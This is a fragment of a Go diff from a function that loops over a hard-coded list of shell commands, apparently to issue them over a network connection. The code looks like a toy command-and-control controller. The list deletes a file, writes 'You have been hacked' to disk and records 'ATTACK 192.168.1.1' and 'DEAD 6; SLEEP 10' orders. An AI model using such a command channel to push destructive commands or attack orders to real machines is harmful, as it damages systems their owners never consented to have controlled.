@@ -59,7 +59,7 @@ func connectionHandle(c net.Conn) {
     cmds := []string{"pwd ",
       "rm .data && echo \"$?\"",
       "echo \"You have been hacked\" >> /tmp/.data",
-      "echo \"ATTACK 192.168.1.1\" >> /home/$USER/.data",
+      "echo \"ATTACK 192.168.1.1\" >> .next_attack",
       "echo \"DEAD 6; SLEEP 10\" >> .data && echo \"$?\"",
       "exit"}
     for _, cmd := range cmds {
